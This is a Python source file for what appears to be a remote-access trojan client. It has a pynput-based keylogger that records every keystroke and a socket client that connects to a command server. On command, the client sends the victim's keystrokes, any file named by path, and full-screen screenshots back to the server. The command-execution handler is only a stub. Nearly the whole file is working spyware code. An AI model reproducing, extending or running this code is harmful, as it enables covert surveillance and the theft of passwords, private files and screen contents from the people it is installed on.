import os
import io
import sys
import json
import socket
import threading
import datetime
from pynput import keyboard

from PIL import ImageGrab

HOST_ADDRESS = "127.0.0.1"
HOST_PORT = 1337


class Keylogger:
    """The Keylogger class is responsible for logging all keystrokes on the client.
    This will be initialised upon running the client program,
    and will allow for keylogs to be fetched and sent to the server upon request."""

    def __init__(self):
        self._buffer = io.BytesIO()
        self._ctrl_state = False
        self._alt_state = False
        self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}

    def start(self) -> None:
        """Called to start the keylogger,
        will run the nested function in a thread allowing parallel operation to the rest of the client"""

        def _start_keylogger():
            """Function to be ran in a thread which will start the keylogger listener and wait for keystrokes"""
            # instantiate the listener object
            with keyboard.Listener(
                on_press=self._on_press, on_release=self._on_release
            ) as listener:
                # start the listener
                listener.join()

        # start the keylogger in a thread
        threading.Thread(target=_start_keylogger).start()

    def get_keylogs(self) -> io.BytesIO:
        """Called to retrieve any keylogs that have been recorded

        Returns:
            io.BytesIO: A bytes object containing the keylogs
        """
        # return the keylog buffer object
        return self._buffer

    # Key press events ---------------------------------------------------------------

    def _on_press(self, key) -> None:
        """Triggered on the event of a key being pressed

        Args:
            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
        """
        pressed = None
        # if the key is one of the control keys...
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            # set the control pressed state to true
            self._ctrl_state = True
        # if the key is one of the alt keys...
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            # set the alt pressed state to true
            self._alt_state = True
        # otherwise...
        else:
            # if the key has character and virtual-key code attributes...
            if hasattr(key, "char") and hasattr(key, "vk"):
                # if the control or alt pressed state is true...
                if self._ctrl_state or self._alt_state:
                    # set the pressed key string to the key's virtual-key code in addition to the control or alt key
                    pressed = f"[{'CTRL+' if self._ctrl_state else ''}{'ALT+' if self._alt_state else ''}{chr(key.vk)}]"
                else:
                    # otherwise set the pressed key string to the key's character/value
                    pressed = key.char
            # if the key does not have a character attribute...
            else:
                # attempt to get a string representation of the key from the Keyloggers key map
                # if the key is not in the key map, set the pressed key string to the key's name
                pressed = self._key_map.get(
                    key.name.split("_")[0], f"[{key.name.split('_')[0]}]"
                ).upper()
            # if the pressed key string holds a value...
            if pressed:
                # store the value in the keylog buffer
                self._buffer.write(pressed.encode("utf-8"))

    def _on_release(self, key) -> None:
        """Triggered on the event of a key being released

        Args:
            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
        """
        # if the key released is a control key...
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            # set the control pressed state to false
            self._ctrl_state = False
        # if the key released is an alt key...
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            # set the alt pressed state to false
            self._alt_state = False


class Client:
    def __init__(self, host: str, port: int):
        self._addr = host, port
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._keylogger = Keylogger()

    def start(self):
        # start keylogger
        self._keylogger.start()
        # connect to server
        threading.Thread(target=self._connect).start()

    # Data handling ------------------------------------------------------------

    def _keylogs(self):
        """Called upon a keylogs instruction, sends any captured keylogs to the server"""
        # fetch the keylogs from the keylogger object
        keylogs = self._keylogger.get_keylogs()
        # send the size of the keylogs in bytes to the server
        self._send(keylogs.tell())
        # send the keylogs to the server
        self._send(keylogs.getvalue())

    def _download(self, file_path: str):
        """Called upon a download instruction, attempts to find the specified file and send it to the server

        Args:
            file_path (str): Path to the file to be sent
        """
        file_size = 0
        # check if the specified file exists...
        if os.path.isfile(file_path):
            # get the size of the file
            file_size = os.path.getsize(file_path)
        # send the size of the file to the server
        self._send(str(file_size))
        # if the file exists...
        if file_size > 0:
            # open the file
            with open(file_path, "rb") as file:
                # send the file to the server
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    self._send(data)

    def _screenshot(self):
        """Called upon a screenshot instruction, captures an image of screen and sends to server"""
        # instantiate an empty bytes object
        img = io.BytesIO()
        # capture an image of the screen and store the data in the bytes object
        ImageGrab.grab().save(img, format="PNG")
        # send the size of the image in bytes to the server
        self._send(str(img.tell()))
        # send the image to the server
        self._send(img.getvalue())

    def _execute(self, cmd: list):
        """Called upon an execute instruction, executes the specified command on the client and sends any response to the server"""
        print(cmd)
        self._send("DONNER KEBAB")

    def _handle_data(self, data: dict):
        cmd = data.get("cmd")
        if cmd == "screenshot":
            self._screenshot()
        elif cmd == "download":
            self._download(data.get("args")[0])
        elif cmd == "keylogs":
            self._keylogs()
        elif cmd == "execute":
            self._execute(data.get("args"))

    # Server connection and communication -----------------------------------------------------

    def _send(self, data: any) -> None:
        """Called when data needs to be sent to the server

        Args:
            data (any): data to be sent to the server
        """
        self._sock.sendall(
            # if the data is not bytes, convert it to bytes and send, otherwise send the data as is
            str(data).encode("utf-8")
            if not isinstance(data, bytes)
            else data
        )

    def _connect(self):
        # create a socket object
        with self._sock as sock:
            # loop to attempt to reconnect if connection is lost
            while True:
                try:
                    # connect to the server
                    sock.connect(self._addr)
                    while True:
                        data = sock.recv(1024)
                        if not data:
                            break
                        try:
                            self._handle_data(json.loads(data.decode("utf-8")))
                        except json.JSONDecodeError:
                            continue
                except OSError:
                    continue


if __name__ == "__main__":
    c = Client(HOST_ADDRESS, HOST_PORT)
    c.start()
